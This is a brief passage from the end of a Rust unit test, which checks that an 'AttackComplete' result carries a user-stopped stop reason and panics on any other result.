                assert_eq!(*reason, StopReason::UserStopped);
            }
            other => panic!("Expected AttackComplete, got {:?}", other),
        }
    }
}
